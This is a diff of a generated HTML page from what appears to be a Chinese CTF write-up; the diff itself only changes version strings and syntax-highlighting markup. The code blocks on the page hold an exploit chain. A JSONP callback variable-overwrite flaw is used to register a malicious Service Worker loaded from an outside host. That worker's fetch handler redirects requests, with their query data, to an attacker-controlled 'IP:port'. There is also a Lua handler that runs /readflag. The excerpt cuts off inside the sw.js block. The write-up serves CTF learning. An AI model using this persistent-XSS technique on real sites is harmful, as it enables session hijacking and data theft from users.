@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.90.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.93.1" /><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -18,7 +18,7 @@
 
     
     
-        <script src="/js/meme.min.8cbe976441b5181abfd3093c9beee209b19cdbb1fa77c48d225a83ba81fa3fb1.js"></script>
+        <script src="/js/meme.min.45a777da25d0b1805991f984be4e9ae5e17f3ea94097882dff058256fa34eb17.js"></script>
 
     
 
@@ -320,28 +320,28 @@
 </span><span class="lnt">21
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-lua" data-lang="lua"><span class="n">require</span> <span class="s2">&#34;string&#34;</span>
-
-<span class="cm">--[[
-</span><span class="cm">     This is the default method name for Lua handlers, see the optional
-</span><span class="cm">     function-name in the LuaMapHandler directive to choose a different
-</span><span class="cm">     entry point.
-</span><span class="cm">--]]</span>
-<span class="kr">function</span> <span class="nf">handle</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
-    <span class="n">r.content_type</span> <span class="o">=</span> <span class="s2">&#34;text/plain&#34;</span>
-    <span class="n">r</span><span class="p">:</span><span class="n">puts</span><span class="p">(</span><span class="s2">&#34;Hello Lua World!</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
-    <span class="kd">local</span> <span class="n">t</span> <span class="o">=</span> <span class="n">io.popen</span><span class="p">(</span><span class="s1">&#39;/readflag&#39;</span><span class="p">)</span>
-    <span class="kd">local</span> <span class="n">a</span> <span class="o">=</span> <span class="n">t</span><span class="p">:</span><span class="n">read</span><span class="p">(</span><span class="s2">&#34;*all&#34;</span><span class="p">)</span>
-    <span class="n">r</span><span class="p">:</span><span class="n">puts</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
-    <span class="kr">if</span> <span class="n">r.method</span> <span class="o">==</span> <span class="s1">&#39;GET&#39;</span> <span class="kr">then</span>
-        <span class="kr">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="kr">in</span> <span class="n">pairs</span><span class="p">(</span> <span class="n">r</span><span class="p">:</span><span class="n">parseargs</span><span class="p">()</span> <span class="p">)</span> <span class="kr">do</span>
-            <span class="n">r</span><span class="p">:</span><span class="n">puts</span><span class="p">(</span> <span class="n">string.format</span><span class="p">(</span><span class="s2">&#34;%s: %s</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span> <span class="p">)</span>
-        <span class="kr">end</span>
-    <span class="kr">else</span>
-        <span class="n">r</span><span class="p">:</span><span class="n">puts</span><span class="p">(</span><span class="s2">&#34;Unsupported HTTP method &#34;</span> <span class="o">..</span> <span class="n">r.method</span><span class="p">)</span>
-    <span class="kr">end</span>
-<span class="kr">end</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-lua" data-lang="lua"><span class="line"><span class="cl"><span class="n">require</span> <span class="s2">&#34;string&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">--[[
+</span></span></span><span class="line"><span class="cl"><span class="cm">     This is the default method name for Lua handlers, see the optional
+</span></span></span><span class="line"><span class="cl"><span class="cm">     function-name in the LuaMapHandler directive to choose a different
+</span></span></span><span class="line"><span class="cl"><span class="cm">     entry point.
+</span></span></span><span class="line"><span class="cl"><span class="cm">--]]</span>
+</span></span><span class="line"><span class="cl"><span class="kr">function</span> <span class="nf">handle</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r.content_type</span> <span class="o">=</span> <span class="s2">&#34;text/plain&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="p">:</span><span class="n">puts</span><span class="p">(</span><span class="s2">&#34;Hello Lua World!</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">local</span> <span class="n">t</span> <span class="o">=</span> <span class="n">io.popen</span><span class="p">(</span><span class="s1">&#39;/readflag&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">local</span> <span class="n">a</span> <span class="o">=</span> <span class="n">t</span><span class="p">:</span><span class="n">read</span><span class="p">(</span><span class="s2">&#34;*all&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="p">:</span><span class="n">puts</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">if</span> <span class="n">r.method</span> <span class="o">==</span> <span class="s1">&#39;GET&#39;</span> <span class="kr">then</span>
+</span></span><span class="line"><span class="cl">        <span class="kr">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="kr">in</span> <span class="n">pairs</span><span class="p">(</span> <span class="n">r</span><span class="p">:</span><span class="n">parseargs</span><span class="p">()</span> <span class="p">)</span> <span class="kr">do</span>
+</span></span><span class="line"><span class="cl">            <span class="n">r</span><span class="p">:</span><span class="n">puts</span><span class="p">(</span> <span class="n">string.format</span><span class="p">(</span><span class="s2">&#34;%s: %s</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="kr">end</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">else</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="p">:</span><span class="n">puts</span><span class="p">(</span><span class="s2">&#34;Unsupported HTTP method &#34;</span> <span class="o">..</span> <span class="n">r.method</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">end</span>
+</span></span><span class="line"><span class="cl"><span class="kr">end</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>补：在日常浏览群消息学习中看到有人在问为什么要使用lua脚本语言，顿时觉得自己可能只是顺着wp的思路走，并没有什么思考，只是知其然不知其所以然。</p>
 <p>      还好后来有师傅解答了这个问题：<code>响应头返回了openresty</code>。</p>
@@ -404,41 +404,41 @@
 </span><span class="lnt">34
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="nx">callback</span> <span class="o">=</span> <span class="s2">&#34;get_user_login_status&#34;</span><span class="p">;</span>
-<span class="nx">auto_reg_var</span><span class="p">();</span>
-<span class="k">if</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="nx">jump_url</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&#34;undefined&#34;</span> <span class="o">||</span> <span class="sr">/^\//</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">jump_url</span><span class="p">)){</span>
-    <span class="nx">jump_url</span> <span class="o">=</span> <span class="s2">&#34;/&#34;</span><span class="p">;</span>
-<span class="p">}</span>
-<span class="nx">jsonp</span><span class="p">(</span><span class="s2">&#34;https://auth.hardxss.xhlj.wetolink.com/api/loginStatus?callback=&#34;</span> <span class="o">+</span> <span class="nx">callback</span><span class="p">,</span><span class="kd">function</span><span class="p">(</span><span class="nx">result</span><span class="p">){</span>
-    <span class="k">if</span><span class="p">(</span><span class="nx">result</span><span class="p">[</span><span class="s1">&#39;status&#39;</span><span class="p">]){</span>
-        <span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="nx">jump_url</span><span class="p">;</span>
-    <span class="p">}</span>
-<span class="p">})</span>
-<span class="kd">function</span> <span class="nx">jsonp</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="nx">success</span><span class="p">)</span> <span class="p">{</span>
-    <span class="kd">var</span> <span class="nx">script</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&#34;script&#34;</span><span class="p">);</span>
-    <span class="k">if</span><span class="p">(</span><span class="nx">url</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s2">&#34;callback&#34;</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
-        <span class="kd">var</span> <span class="nx">funName</span> <span class="o">=</span> <span class="s1">&#39;callback_&#39;</span> <span class="o">+</span> <span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span> <span class="o">+</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">().</span><span class="nx">toString</span><span class="p">().</span><span class="nx">substr</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span>
-        <span class="nx">url</span> <span class="o">=</span> <span class="nx">url</span> <span class="o">+</span> <span class="s2">&#34;?&#34;</span> <span class="o">+</span> <span class="s2">&#34;callback=&#34;</span> <span class="o">+</span> <span class="nx">funName</span><span class="p">;</span>
-    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
-        <span class="kd">var</span> <span class="nx">funName</span> <span class="o">=</span> <span class="nx">callback</span><span class="p">;</span>
-    <span class="p">}</span>
-    <span class="nb">window</span><span class="p">[</span><span class="nx">funName</span><span class="p">]</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
-        <span class="nx">success</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
-        <span class="k">delete</span> <span class="nb">window</span><span class="p">[</span><span class="nx">funName</span><span class="p">];</span>
-        <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">removeChild</span><span class="p">(</span><span class="nx">script</span><span class="p">);</span>
-    <span class="p">}</span>
-    <span class="nx">script</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">url</span><span class="p">;</span>
-    <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">script</span><span class="p">);</span>
-<span class="p">}</span>
-<span class="kd">function</span> <span class="nx">auto_reg_var</span><span class="p">(){</span>
-    <span class="kd">var</span> <span class="nx">search</span> <span class="o">=</span> <span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
-    <span class="kd">var</span> <span class="nx">search_arr</span> <span class="o">=</span> <span class="nx">search</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;&amp;&#39;</span><span class="p">);</span>
-    <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">search_arr</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">){</span>
-        <span class="p">[</span><span class="nx">key</span><span class="p">,</span><span class="nx">value</span><span class="p">]</span> <span class="o">=</span> <span class="nx">search_arr</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">split</span><span class="p">(</span><span class="s2">&#34;=&#34;</span><span class="p">);</span>
-        <span class="nb">window</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">=</span> <span class="nx">value</span><span class="p">;</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">callback</span> <span class="o">=</span> <span class="s2">&#34;get_user_login_status&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">auto_reg_var</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="nx">jump_url</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&#34;undefined&#34;</span> <span class="o">||</span> <span class="sr">/^\//</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">jump_url</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">jump_url</span> <span class="o">=</span> <span class="s2">&#34;/&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">jsonp</span><span class="p">(</span><span class="s2">&#34;https://auth.hardxss.xhlj.wetolink.com/api/loginStatus?callback=&#34;</span> <span class="o">+</span> <span class="nx">callback</span><span class="p">,</span><span class="kd">function</span><span class="p">(</span><span class="nx">result</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">result</span><span class="p">[</span><span class="s1">&#39;status&#39;</span><span class="p">]){</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="nx">jump_url</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">jsonp</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="nx">success</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">script</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&#34;script&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">url</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s2">&#34;callback&#34;</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">funName</span> <span class="o">=</span> <span class="s1">&#39;callback_&#39;</span> <span class="o">+</span> <span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span> <span class="o">+</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">().</span><span class="nx">toString</span><span class="p">().</span><span class="nx">substr</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">url</span> <span class="o">=</span> <span class="nx">url</span> <span class="o">+</span> <span class="s2">&#34;?&#34;</span> <span class="o">+</span> <span class="s2">&#34;callback=&#34;</span> <span class="o">+</span> <span class="nx">funName</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">funName</span> <span class="o">=</span> <span class="nx">callback</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">window</span><span class="p">[</span><span class="nx">funName</span><span class="p">]</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">success</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">delete</span> <span class="nb">window</span><span class="p">[</span><span class="nx">funName</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">removeChild</span><span class="p">(</span><span class="nx">script</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">script</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">url</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">script</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">auto_reg_var</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">search</span> <span class="o">=</span> <span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">search_arr</span> <span class="o">=</span> <span class="nx">search</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;&amp;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">search_arr</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="p">[</span><span class="nx">key</span><span class="p">,</span><span class="nx">value</span><span class="p">]</span> <span class="o">=</span> <span class="nx">search_arr</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">split</span><span class="p">(</span><span class="s2">&#34;=&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">window</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">=</span> <span class="nx">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>发现实现跳转的函数<strong>jsonp</strong>，<u>jsonp可以用于<strong>跨域数据的访问</strong></u>，但是此处存在一个<strong>变量覆盖漏洞</strong>：</p>
 <div class="highlight"><div class="chroma">
@@ -457,19 +457,19 @@
 </span><span class="lnt">12
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kd">function</span> <span class="nx">auto_reg_var</span><span class="p">(){</span>
-    <span class="kd">var</span> <span class="nx">search</span> <span class="o">=</span> <span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
-    <span class="kd">var</span> <span class="nx">search_arr</span> <span class="o">=</span> <span class="nx">search</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;&amp;&#39;</span><span class="p">);</span>
-    <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">search_arr</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">){</span>
-        <span class="p">[</span><span class="nx">key</span><span class="p">,</span><span class="nx">value</span><span class="p">]</span> <span class="o">=</span> <span class="nx">search_arr</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">split</span><span class="p">(</span><span class="s2">&#34;=&#34;</span><span class="p">);</span>
-        <span class="nb">window</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">=</span> <span class="nx">value</span><span class="p">;</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-
-<span class="c1">// callback赋值方式：
-</span><span class="c1">// var funName = &#39;callback_&#39; + Date.now() + Math.random().toString().substr(2, 5);
-</span><span class="c1">// url = url + &#34;?&#34; + &#34;callback=&#34; + funName;
-</span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">auto_reg_var</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">search</span> <span class="o">=</span> <span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">search_arr</span> <span class="o">=</span> <span class="nx">search</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;&amp;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">search_arr</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="p">[</span><span class="nx">key</span><span class="p">,</span><span class="nx">value</span><span class="p">]</span> <span class="o">=</span> <span class="nx">search_arr</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">split</span><span class="p">(</span><span class="s2">&#34;=&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">window</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">=</span> <span class="nx">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// callback赋值方式：
+</span></span></span><span class="line"><span class="cl"><span class="c1">// var funName = &#39;callback_&#39; + Date.now() + Math.random().toString().substr(2, 5);
+</span></span></span><span class="line"><span class="cl"><span class="c1">// url = url + &#34;?&#34; + &#34;callback=&#34; + funName;
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>      在对callback赋值时并没有经过任何的检查和过滤，导致可以通过<code>注释符//</code>实现变量覆盖，例如<code>https://xss.hardxss.xhlj.wetolink.com/login?callback=alert(1)//</code>可以实现弹窗功能。</p>
 <p>因此，jsonp就可以作为Service Worker的利用点进行XSS持久化。</p>
@@ -493,17 +493,17 @@
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="c1">// aaa.js
-</span><span class="c1"></span><span class="nb">document</span><span class="p">.</span><span class="nx">domain</span> <span class="o">=</span> <span class="s2">&#34;hardxss.xhlj.wetolink.com&#34;</span><span class="p">;</span>
-<span class="kd">var</span> <span class="nx">iff</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;iframe&#39;</span><span class="p">);</span>
-<span class="nx">iff</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="s1">&#39;https://auth.hardxss.xhlj.wetolink.com/&#39;</span><span class="p">;</span>
-<span class="nx">iff</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">&#34;load&#34;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(){</span> <span class="nx">iffLoadover</span><span class="p">();</span> <span class="p">});</span>
-<span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">iff</span><span class="p">);</span>
-<span class="nx">exp</span> <span class="o">=</span> <span class="sb">`navigator.serviceWorker.register(&#34;/api/loginStatus?callback=self.importScripts(&#39;//404.buuoj.cn/a/sw.js&#39;)//&#34;)`</span><span class="p">;</span>
-<span class="kd">function</span> <span class="nx">iffLoadover</span><span class="p">(){</span>
-    <span class="nx">iff</span><span class="p">.</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">eval</span><span class="p">(</span><span class="nx">exp</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// aaa.js
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nb">document</span><span class="p">.</span><span class="nx">domain</span> <span class="o">=</span> <span class="s2">&#34;hardxss.xhlj.wetolink.com&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">iff</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;iframe&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">iff</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="s1">&#39;https://auth.hardxss.xhlj.wetolink.com/&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">iff</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">&#34;load&#34;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(){</span> <span class="nx">iffLoadover</span><span class="p">();</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">iff</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">exp</span> <span class="o">=</span> <span class="sb">`navigator.serviceWorker.register(&#34;/api/loginStatus?callback=self.importScripts(&#39;//404.buuoj.cn/a/sw.js&#39;)//&#34;)`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">iffLoadover</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">iff</span><span class="p">.</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">eval</span><span class="p">(</span><span class="nx">exp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>安装和启用Service Worker，并在脚本每次对外访问资源时都拦截相应参数：</p>
 <div class="highlight"><div class="chroma">
@@ -527,24 +527,24 @@
 </span><span class="lnt">17
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="c1">// sw.js
-</span><span class="c1"></span><span class="nx">self</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;install&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
-        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;install ok!&#39;</span><span class="p">);</span>
-<span class="p">});</span>
-<span class="nx">self</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;fetch&#39;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
-        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">request</span><span class="p">);</span>
-        <span class="nx">event</span><span class="p">.</span><span class="nx">respondWith</span><span class="p">(</span>
-        <span class="nx">caches</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">request</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">res</span><span class="p">){</span>
-        <span class="k">return</span> <span class="nx">requestBackend</span><span class="p">(</span><span class="nx">event</span><span class="p">);</span>
-        <span class="p">})</span>
-        <span class="p">)</span>
-   <span class="p">});</span>
-<span class="kd">function</span> <span class="nx">requestBackend</span><span class="p">(</span><span class="nx">event</span><span class="p">){</span>
-        <span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="nx">event</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">clone</span><span class="p">();</span>
-        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>
-        <span class="k">return</span> <span class="k">new</span> <span class="nx">Response</span><span class="p">(</span><span class="s2">&#34;&lt;script&gt;location=&#39;http://IP:port/&#39;+location.search;&lt;/script&gt;&#34;</span><span class="p">,</span> <span class="p">{</span><span class="nx">headers</span><span class="o">:</span> <span class="p">{</span> <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;text/html&#39;</span> <span class="p">}})</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="c1">// sw.js
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">self</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;install&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;install ok!&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="nx">self</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;fetch&#39;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">request</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">event</span><span class="p">.</span><span class="nx">respondWith</span><span class="p">(</span>
